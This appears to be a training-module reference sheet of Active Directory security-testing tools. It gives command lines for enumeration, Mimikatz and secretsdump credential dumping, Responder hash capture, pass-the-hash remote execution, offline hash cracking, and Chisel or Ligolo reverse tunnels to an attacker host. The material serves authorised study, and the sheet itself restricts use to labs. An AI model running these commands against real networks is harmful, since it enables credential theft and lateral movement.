# 🛠️ Active Directory Security Testing — Complete Tools Reference

> **Purpose:** Consolidated tool reference for the entire AD module.

---

# 📊 Tools by Phase

| Phase | Main Tools |
|---|---|
| Recon | `nmap`, `nslookup`, `dig` |
| Username Enumeration | `Kerbrute` |
| SMB | `smbclient`, `rpcclient`, `NetExec` |
| LDAP / RPC | `ldapsearch`, `rpcclient` |
| Initial Breach | `Kerbrute`, `NetExec`, `Responder`, `Hashcat` |
| Authenticated Enumeration | `PowerShell`, `PowerView`, `BloodHound`, `SharpHound`, `NetExec` |
| Credential Harvesting | `Mimikatz`, `secretsdump.py`, `reg.exe` |
| Kerberos | `GetUserSPNs.py`, `getTGT.py`, `getST.py`, `Rubeus`, `klist` |
| Remote Execution | `psexec.py`, `wmiexec.py`, `smbexec.py`, `dcomexec.py`, `atexec.py`, `Evil-WinRM` |
| Pivoting | `SSH`, `ProxyChains`, `Chisel`, `Ligolo-ng` |
| Cracking | `Hashcat`, `John the Ripper` |
| Detection | Windows Event Viewer, Sysmon |
| CTF Documentation | Markdown / Git |

---

# 1️⃣ Nmap

## Purpose

Network and service enumeration.

```bash
nmap -p- TARGET
```

Useful AD discovery:

```bash
nmap -sC -sV TARGET
```

Look especially for:

```text
53
88
135
139
389
445
464
636
3268
3269
3389
```

---

# 2️⃣ nslookup / dig

## Purpose

DNS and AD service discovery.

Example:

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN DC_IP
```

Kerberos:

```bash
nslookup -type=SRV _kerberos._tcp.DOMAIN DC_IP
```

---

# 3️⃣ Kerbrute

## Purpose

Kerberos username enumeration.

```bash
kerbrute userenum -d DOMAIN --dc DC_IP usernames.txt
```

Save results:

```bash
kerbrute userenum -d DOMAIN --dc DC_IP usernames.txt -o valid_users.txt
```

---

# 4️⃣ smbclient

## Purpose

SMB share enumeration and interaction.

Anonymous:

```bash
smbclient //TARGET/SHARE -N
```

Inside:

```text
dir
get FILE
put FILE
```

---

# 5️⃣ rpcclient

## Purpose

RPC enumeration.

```bash
rpcclient -U "" TARGET -N
```

Common enumeration commands:

```text
enumdomusers
enumdomgroups
querydominfo
lookupnames
```

---

# 6️⃣ ldapsearch

## Purpose

LDAP directory enumeration.

Useful for discovering:

```text
Users
Groups
Computers
SPNs
Directory attributes
```

---

# 7️⃣ NetExec

Command:

```bash
nxc
```

SMB credential validation:

```bash
nxc smb TARGET -u USER -p 'PASSWORD'
```

Domain authentication:

```bash
nxc smb TARGET -u USER -p 'PASSWORD' -d DOMAIN
```

Hash authentication:

```bash
nxc smb TARGET -u USER -H NT_HASH
```

Local authentication:

```bash
nxc smb TARGET -u Administrator -H NT_HASH --local-auth
```

Command execution:

```bash
nxc smb TARGET -x 'whoami /all'
```

PowerShell:

```bash
nxc smb TARGET -X '$PSVersionTable'
```

---

# 8️⃣ BloodHound

## Purpose

AD relationship and attack-path analysis.

Useful for identifying:

```text
Group Membership
ACL Relationships
Sessions
Local Admin Rights
Delegation
Attack Paths
```

---

# 9️⃣ SharpHound

## Purpose

Collect AD data for BloodHound.

Typical collection concept:

```text
Domain
 ↓
Users
Groups
Computers
Sessions
ACLs
Trusts
 ↓
BloodHound
```

---

# 🔟 PowerView

PowerShell-based AD enumeration.

Useful areas:

```text
Users
Groups
Computers
Sessions
SPNs
ACLs
Domain information
```

---

# 1️⃣1️⃣ PowerShell ActiveDirectory

Windows PowerShell AD module.

Useful for querying:

```text
Get-ADUser
Get-ADGroup
Get-ADComputer
Get-ADDomain
Get-ADGroupMember
```

---

# 1️⃣2️⃣ Mimikatz

Major credential and Kerberos operation tool.

Important examples from the notes:

```text
privilege::debug
sekurlsa::logonpasswords
vault::list
vault::cred /export
lsadump::sam
token::elevate
lsadump::cache
```

Kerberos:

```text
kerberos::ptt ticket.kirbi
```

Overpass-the-Hash:

```text
sekurlsa::pth
```

---

# 1️⃣3️⃣ secretsdump.py

Part of Impacket.

Local extraction:

```bash
secretsdump.py DOMAIN/USER:PASSWORD@TARGET
```

Domain extraction:

```bash
secretsdump.py DOMAIN/USER:PASSWORD@DC -just-dc
```

---

# 1️⃣4️⃣ GetUserSPNs.py

## Purpose

Enumerate Kerberos service accounts / SPNs.

Example:

```bash
GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DC_IP
```

Relevant to:

```text
Kerberoasting
```

---

# 1️⃣5️⃣ getTGT.py

## Purpose

Request a Kerberos TGT.

```bash
getTGT.py DOMAIN/USER:PASSWORD
```

A credential cache may be produced.

---

# 1️⃣6️⃣ getST.py

## Purpose

Request Kerberos service tickets.

It is also used in delegation-related workflows.

Example lab pattern:

```bash
getST.py -spn SERVICE/DC -impersonate USER -dc-ip DC_IP DOMAIN/SERVICE_ACCOUNT:PASSWORD
```

---

# 1️⃣7️⃣ ticketer.py

## Purpose

Kerberos ticket creation in authorised lab scenarios.

Relevant to understanding:

```text
Golden Tickets
Silver Tickets
```

---

# 1️⃣8️⃣ Rubeus

Windows Kerberos toolkit.

Useful for:

```text
TGT operations
TGS operations
Ticket enumeration
Pass-the-Ticket
Kerberos abuse
```

---

# 1️⃣9️⃣ klist

View Kerberos tickets in the current session:

```cmd
klist
```

Useful when studying:

```text
TGT
TGS
CCache
Pass-the-Ticket
```

---

# 2️⃣0️⃣ Hashcat

Password and hash cracking.

NetNTLMv2 example from the CTF:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

DCC2 / MSCache2 example:

```bash
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

# 2️⃣1️⃣ John the Ripper

Used in the credential-harvesting notes for offline cracking.

Example:

```bash
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

# 2️⃣2️⃣ Responder

Used for authorised lab authentication capture.

Example:

```bash
responder -I ens5 -v
```

In the Proxy CTF it captured:

```text
svc.scanner
NetNTLMv2
```

---

# 2️⃣3️⃣ PsExec

Impacket remote execution:

```bash
psexec.py DOMAIN/USER:PASSWORD@TARGET
```

Hash-based lab example:

```bash
psexec.py -hashes :NT_HASH USER@TARGET
```

---

# 2️⃣4️⃣ wmiexec.py

WMI-based remote execution.

---

# 2️⃣5️⃣ smbexec.py

SMB/service-based remote execution.

Kerberos lab example:

```bash
smbexec.py -k -no-pass DOMAIN/USER@TARGET
```

---

# 2️⃣6️⃣ dcomexec.py

DCOM-based remote execution.

---

# 2️⃣7️⃣ atexec.py

Task Scheduler / RPC-based remote execution.

---

# 2️⃣8️⃣ Evil-WinRM

WinRM PowerShell session:

```bash
evil-winrm -i TARGET -u USER -p 'PASSWORD'
```

Hash-based lab example:

```bash
evil-winrm -i TARGET -u Administrator -H NT_HASH
```

---

# 2️⃣9️⃣ SSH

Local port forwarding:

```bash
ssh -L LOCAL_PORT:INTERNAL_IP:PORT USER@PIVOT -N
```

Dynamic SOCKS:

```bash
ssh -f -D 1080 USER@PIVOT -N
```

---

# 3️⃣0️⃣ ProxyChains

Route compatible TCP applications through a SOCKS proxy.

Example:

```bash
proxychains nxc smb INTERNAL_TARGET -u USER -p 'PASSWORD'
```

---

# 3️⃣1️⃣ Chisel

HTTP-based tunnelling.

Server:

```bash
chisel server --port 8080 --reverse
```

Client:

```cmd
chisel.exe client ATTACKBOX_IP:8080 R:1080:socks
```

---

# 3️⃣2️⃣ Ligolo-ng

TUN-based pivoting.

Proxy:

```bash
sudo ./proxy -selfcert
```

Agent:

```bash
./agent -connect ATTACKBOX_IP:11601 -accept-fingerprint FINGERPRINT
```

---

# 3️⃣3️⃣ Sysmon

Useful for defensive investigation.

Important events:

```text
Event ID 1
→ Process Creation

Event ID 10
→ Process Access
```

Event ID 10 can help identify suspicious access to:

```text
lsass.exe
```

---

# 🧭 Tool Selection Cheat Sheet

```text
Need IP/Port Info?
→ Nmap

Need DNS/DC Info?
→ nslookup / dig

Need usernames?
→ Kerbrute

Need SMB?
→ smbclient / NetExec

Need RPC?
→ rpcclient

Need LDAP?
→ ldapsearch

Have Domain Credentials?
→ NetExec / BloodHound / PowerView

Need AD Attack Paths?
→ BloodHound + SharpHound

Need Kerberos SPNs?
→ GetUserSPNs.py

Need TGT?
→ getTGT.py

Need Service Ticket?
→ getST.py

Need Credential Material?
→ Mimikatz / secretsdump.py

Need Offline Cracking?
→ Hashcat / John

Need Remote Execution?
→ PsExec / WMIExec / SMBExec / Evil-WinRM

Need Pivoting?
→ SSH / ProxyChains / Chisel / Ligolo-ng
```

---

# ⚠️ Authorisation

These tools can enumerate systems, capture credentials, extract authentication material, execute commands remotely and move between hosts.

Use them only in:

```text
CTF / Training Labs
Your Own Lab
Explicitly Authorised Environments
```
